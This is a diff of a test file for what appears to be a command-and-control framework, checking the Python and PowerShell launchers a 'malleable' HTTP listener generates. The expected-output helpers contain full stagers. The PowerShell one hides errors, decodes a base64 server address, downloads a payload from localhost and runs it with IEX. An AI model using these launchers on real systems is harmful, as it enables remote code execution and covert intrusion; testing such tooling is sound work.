@@ -1,3 +1,4 @@
+from pathlib import Path
 from textwrap import dedent
 from unittest.mock import MagicMock, Mock
 
@@ -17,6 +18,7 @@ def _setup_staging_key(session_local, models):
 def main_menu_mock(models):
     main_menu = Mock()
     main_menu.installPath = ""
+    main_menu.install_path = Path()
     main_menu.listeners.activeListeners = {}
     main_menu.listeners.listeners = {}
     return main_menu
@@ -201,49 +203,13 @@ def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
         listener_name="fake_listener", language="python", encode=False
     )
 
-    # can't control the random characters in the url path, so just removing it from the comparison.
-    python_launcher_start = python_launcher.find("http://localhost:80/")
-    python_launcher_end = python_launcher_start + len("http://localhost:80/ckcivvgr/")
-    python_launcher = (
-        python_launcher[:python_launcher_start] + python_launcher[python_launcher_end:]
-    )
-
-    expected_python_launcher = _expected_http_malleable_python_launcher()
-    expected_python_launcher_start = expected_python_launcher.find(
-        "http://localhost:80/"
-    )
-    expected_python_launcher_end = expected_python_launcher_start + len(
-        "http://localhost:80/ckcivvgr/"
-    )
-    expected_python_launcher = (
-        expected_python_launcher[:expected_python_launcher_start]
-        + expected_python_launcher[expected_python_launcher_end:]
-    )
-
-    assert python_launcher == expected_python_launcher
+    assert python_launcher == _expected_http_malleable_python_launcher()
 
     powershell_launcher = http_malleable_listener.generate_launcher(
         listener_name="fake_listener", language="powershell", encode=False
     )
 
-    powershell_launcher_start = powershell_launcher.find(")));$t=")
-    powershell_launcher_end = powershell_launcher_start + len(")));$t='/fkcriywd/")
-    powershell_launcher = (
-        powershell_launcher[:powershell_launcher_start]
-        + powershell_launcher[powershell_launcher_end:]
-    )
-
-    expected_powershell_launcher = _expected_http_malleable_powershell_launcher()
-    expected_python_launcher_start = expected_powershell_launcher.find(")));$t=")
-    expected_python_launcher_end = expected_python_launcher_start + len(
-        ")));$t='/fkcriywd/"
-    )
-    expected_powershell_launcher = (
-        expected_powershell_launcher[:expected_python_launcher_start]
-        + expected_powershell_launcher[expected_python_launcher_end:]
-    )
-
-    assert powershell_launcher == expected_powershell_launcher
+    assert powershell_launcher == _expected_http_malleable_powershell_launcher()
 
 
 def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
@@ -369,7 +335,7 @@ def _expected_http_malleable_python_launcher():
         o = urllib.request.build_opener(proxy)
         urllib.request.install_opener(o)
         vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})
-        req=vreq('http://localhost:80/bcsjngnk/', )
+        req=vreq('http://localhost:80/init/', )
         req.verb='GET'
         req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
         req.add_header('Cookie','session=cm91dGluZyBwYWNrZXQ%3D')
@@ -382,7 +348,7 @@ def _expected_http_malleable_python_launcher():
 
 
 def _expected_http_malleable_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/zxxuhptp/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
+    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/init/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _fake_malleable_profile():
